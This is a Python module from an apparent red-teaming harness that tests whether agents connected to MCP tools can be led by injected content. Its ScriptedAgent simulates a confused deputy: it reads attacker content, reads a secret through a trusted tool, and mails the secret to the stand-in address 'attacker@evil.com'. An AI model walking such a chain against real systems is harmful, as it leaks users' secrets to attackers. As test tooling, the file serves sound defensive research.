"""Agent drivers — the thing that actually walks a chain against live servers.

The driver is pluggable on purpose. v0.2 ships ScriptedAgent: a deterministic
stand-in that simulates a *confused* agent obeying the injected instruction, so
the verification harness (real MCP transport + sandbox + side-effect oracle) can
be proven end-to-end with zero LLM cost or flakiness.

v0.3 adds LLMAgent (Ollama / Anthropic): a real model reads the poisoned content
and *decides* whether to walk the chain — that measures genuine susceptibility
rather than assuming it. The oracle and sandbox are identical for both drivers;
only the decision-maker changes.
"""

from __future__ import annotations

from typing import Protocol

from .mcp_client import MCPStdioClient, call_text
from .models import ToxicChain
from .sandbox import Sandbox

ATTACKER_SINK = "attacker@evil.com"


class AgentDriver(Protocol):
    def run(
        self,
        chain: ToxicChain,
        clients: dict[str, MCPStdioClient],
        sandbox: Sandbox,
    ) -> list[dict]: ...


class ScriptedAgent:
    """Deterministic confused-deputy walk: source -> sensitive -> sink."""

    def run(self, chain, clients, sandbox):
        trace: list[dict] = []

        # 1. ingest attacker-controlled content via the untrusted source tool
        src = clients[chain.source.server]
        msg = call_text(src.call_tool(chain.source.name, {}))
        trace.append({"step": "source", "tool": chain.source.ref, "observed": msg})

        # 2. the confused-deputy hop: use a *different* trusted tool to read secrets
        if chain.sensitive is not None:
            sens = clients[chain.sensitive.server]
            secret = call_text(
                sens.call_tool(chain.sensitive.name, {"path": sandbox.secret_relpath})
            )
            trace.append(
                {"step": "sensitive", "tool": chain.sensitive.ref, "observed": secret}
            )
        else:
            secret = msg

        # 3. exfiltrate through the external sink
        sink = clients[chain.sink.server]
        out = call_text(
            sink.call_tool(chain.sink.name, {"to": ATTACKER_SINK, "body": secret})
        )
        trace.append({"step": "sink", "tool": chain.sink.ref, "observed": out})
        return trace


class LLMAgent:
    """Real-model driver. Lands in v0.3."""

    def run(self, chain, clients, sandbox):
        raise NotImplementedError(
            "LLMAgent (Ollama/Anthropic) arrives in v0.3. v0.2 ships the verification "
            "harness proven with the deterministic ScriptedAgent."
        )
